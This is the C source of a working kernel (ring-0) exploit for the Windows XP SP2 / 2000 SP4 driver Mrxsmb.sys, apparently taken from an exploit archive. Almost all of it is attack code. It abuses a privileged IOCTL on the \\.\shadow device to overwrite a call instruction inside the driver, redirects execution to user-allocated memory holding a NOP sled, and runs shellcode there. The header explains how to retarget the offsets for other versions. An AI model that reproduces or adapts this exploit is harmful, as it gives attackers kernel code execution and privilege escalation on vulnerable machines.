///////////////////////////////////////////////////////////////////////////////////////
// Mrxsmb.sys XP & 2K Ring0 Exploit (6/12/2005)
// Tested on XP SP2 && 2K SP4 
// Disable ReadOnly Memory protection
// HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\EnforceWriteProtection = 0
// -----------------------------------------------------------------------------------
// ONLY FOR EDUCATIONAL PURPOSES.
// -----------------------------------------------------------------------------------
// Rubén Santamarta.
// www.reversemode.com
// -----------------------------------------------------------------------------------
// OVERVIEW
// -----------------------------------------------------------------------------------
// There are 3 possible values to change in order to adjust the exploit to other versions.
// # XPSP2 (XP Service Pack 2)
// This variable is equal to the File offset of the Call that we are modifying minus 0xC
//. #XPSP2 => 3D88020000                   cmp         eax,000000288
//.           770B                         ja         .000064BBE  --
//.           50                           push        eax
//.           51                           push        ecx
//.           E812E2FFFF                   call       .000062DCC  -- MODIFIED CALL --
// -----------------------------------------------------------------------------------
// #W2KSP4 (Windows 2000 Service Pack 4)
// The same method previosly explained but regarding to Windows 2000 Service Pack 4.
// -----------------------------------------------------------------------------------
// $OffWord
// This variable is defined in CalcJump() Function. 
// E812E2FFFF  call       .000062DCC  -- MODIFIED CALL -- 
// The exploit calculates automatically the relative jump, but we need to provide it
// the 2 bytes following opcode Call(0xE8). In example, as we can see, to test in XP
// OffWord will be equal to 0xE212.
//////////////////////////////////////////////////////////////////////////////////////



#include <windows.h>
#include <stdio.h>


#define XPSP2		0x54BAC  
#define W2KSP4		0x50ADD
#define MAGIC_IOCTL 0x141043

typedef BOOL (WINAPI *PENUMDEVICES)(LPVOID*,
									DWORD ,
									LPDWORD);

typedef DWORD (WINAPI *PGETDEVNAME)(LPVOID ImageBase,
									LPTSTR lpBaseName,
									DWORD nSize);

VOID ShowError()
{
 LPVOID lpMsgBuf;
 FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER| FORMAT_MESSAGE_FROM_SYSTEM,
               NULL,
               GetLastError(),
               MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
               (LPTSTR) &lpMsgBuf,
               0,
               NULL);
 MessageBoxA(0,(LPTSTR)lpMsgBuf,"Error",0);
 exit(1);
}

DWORD CalcJump(DWORD BaseMRX,BOOL InXP,DWORD *hValue,DWORD *ShellAddr)
{

      DWORD SumTemp;
      DWORD IniAddress;
	  DWORD i;
	  DWORD sumAux;
	  DWORD addTemp;
	  DWORD OffWord;
	  
	  if(InXP)
	  {
		SumTemp=BaseMRX+XPSP2+0xE;
	    OffWord=0xE212;
	  }
	  else
	  {
	    SumTemp=BaseMRX+W2KSP4+0xE;
		OffWord=0xa971;
	  }
		
	
	  for(i=0x4c;i<0xDDDC;i=i+4)
	  {   
		sumAux=~((i*0x10000)+OffWord);
		addTemp=SumTemp-sumAux;
		if(addTemp>0xE000000 && addTemp<0xF000000){
				IniAddress=addTemp&0xFFFFF000;
				*hValue=i-4;
				*ShellAddr=addTemp;
				break;
		}
	  }
	  printf("\nINFORMATION \n");
	  printf("-----------------------------------------------------\n");
      printf("Patched Driver Call pointing to \t [0x%p]\n",addTemp);
	  
      return (IniAddress);
} 

int main(int argc, char *argv[])
{
 PENUMDEVICES pEnumDeviceDrivers;
 PGETDEVNAME  pGetDeviceDriverBaseName;
 LPVOID arrMods[200],addEx;
 DWORD cb,i,devNum,dwTemp,hValue,Ring0Addr,junk,ShellAddr,BaseMRX=0;
 DWORD *OutBuff,*InBuff;
 HANDLE hDevice;
 BOOL InXP;
 CHAR baseName[255];

 CONST CHAR Ring0ShellCode[]="\xCC";       //"PUT YOUR RING0 CODE HERE :)"
 
 if(argc<2)
 {
  printf("\nMRXSMB.SYS RING0 Exploit\n");
  printf("--- Ruben Santamarta ---\n");
  printf("Tested on XPSP2 & W2KSP4\n");
  printf("\nusage> exploit.exe <XP> or <2K>\n");
  exit(1);
 }
 
 if(strncmp(argv[1],"XP",2)==0)
	 InXP=TRUE;
 else
	 InXP=FALSE;

 pEnumDeviceDrivers=(PENUMDEVICES)GetProcAddress(LoadLibrary("psapi.dll"),
												 "EnumDeviceDrivers");

 pGetDeviceDriverBaseName=(PGETDEVNAME)GetProcAddress(LoadLibrary("psapi.dll"),
												 "GetDeviceDriverBaseNameA");

 pEnumDeviceDrivers(arrMods,sizeof(arrMods),&cb);
 devNum=cb/sizeof(LPVOID);
 printf("\nSearching Mrxsmb.sys Base Address...");

 for(i=1;i<=devNum;i++)
 {
       pGetDeviceDriverBaseName(arrMods[i],baseName,254);
	   if((strncmp(baseName,"mrxsmb",6)==0))
	   {
	  	   printf("[%x] Found!\n",arrMods[i]);
		   BaseMRX=(DWORD)arrMods[i];
	   }
 }

 if(!BaseMRX)
 {
	 printf("Not Found\nExiting\n\n");
	 exit(1);
 }

 addEx=(LPVOID)CalcJump(BaseMRX,InXP,&hValue,&ShellAddr);
 OutBuff=(DWORD*)VirtualAlloc((LPVOID)addEx,0xF000,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE);
 
 if(!OutBuff) ShowError();

 printf("F000h bytes allocated  at \t\t [0x%p]\n",addEx);
 printf("Value needed   \t\t\t	 [0x%p]\n",hValue+4);

 InBuff=OutBuff;
 
 printf("Checking Shadow Device...");
 hDevice = CreateFile("\\\\.\\shadow",
                    FILE_EXECUTE,
                    FILE_SHARE_READ|FILE_SHARE_WRITE,
                    NULL,
                    OPEN_EXISTING,
                    0,
                    NULL);
  
 if (hDevice == INVALID_HANDLE_VALUE) ShowError();
 printf("[OK]\n");
 
 printf("Querying Device...\n");

 while(OutBuff[3]< hValue)
  {
			DeviceIoControl(hDevice,      // "\\.\shadow"
                            MAGIC_IOCTL,  // Privileged IOCTL
                            InBuff, 2,    // InBuffer, InBufferSize
                            OutBuff, 0x18,// OutBuffer,OutBufferSize
                            &junk,        // bytes returned
                            (LPOVERLAPPED) NULL);
  
  printf("\r\t[->]VALUES: (%x)",OutBuff[3]);
  }

  if(InXP)
	  Ring0Addr=BaseMRX+XPSP2;
  else
	  Ring0Addr=BaseMRX+W2KSP4; 
  
  printf("Overwritting Driver Call at[%x]...",Ring0Addr);
  DeviceIoControl(hDevice,      // "\\.\shadow"
                            MAGIC_IOCTL,  // Privileged IOCTL
                            InBuff, 2,    // InBuffer, InBufferSize
                            (LPVOID)Ring0Addr, 0x18,// OutBuffer,OutBufferSize 0x
                            &junk,        // bytes returned
                            (LPOVERLAPPED) NULL);
  
  printf("[OK]\n");
  for(i=1;i<0x3C00;i++) OutBuff[i]=0x90909090;
  
  memcpy((LPVOID*)ShellAddr,(LPVOID*)Ring0ShellCode,sizeof(Ring0ShellCode));
 
  
  printf("Sending IOCTL to execute the ShellCode\n");
  
  DeviceIoControl(hDevice,      // "\\.\shadow"
                            MAGIC_IOCTL,  // Privileged IOCTL
                            InBuff, 2,    // InBuffer, InBufferSize
                            OutBuff, 0x18,// OutBuffer,OutBufferSize
                            &junk,        // bytes returned
                            (LPOVERLAPPED) NULL);

  dwTemp=CloseHandle(hDevice);
  if(!dwTemp) ShowError();

  dwTemp=VirtualFree(OutBuff,0xf000,MEM_DECOMMIT);
  if(!dwTemp) ShowError();

  return(1);
}

// milw0rm.com [2006-06-14]
